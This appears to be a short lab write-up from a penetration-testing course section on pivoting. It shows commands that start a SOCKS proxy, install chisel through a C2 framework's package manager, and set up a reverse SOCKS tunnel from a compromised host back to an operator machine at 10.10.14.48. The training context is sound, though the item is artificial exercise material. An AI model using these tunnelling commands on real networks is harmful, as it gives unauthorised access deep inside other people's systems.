# [Pivoting](Pivoting.md)
### Replicate the methods in the section. Is the user svc_sql an administrator on SRV02 (Yes/No)

```sh
socks5 start -P 1080

armory install chisel

chisel
```

![](Screenshot%202026-11-10%20at%2013.43.03.png)

```sh
chisel client 10.10.14.48:1337 R:1081:socks
```

![](Screenshot%202026-11-10%20at%2013.51.45.png)

```bash
chisel server --reverse -p 1337 -v --socks5
```

![](Screenshot%202026-11-10%20at%2013.52.14.png)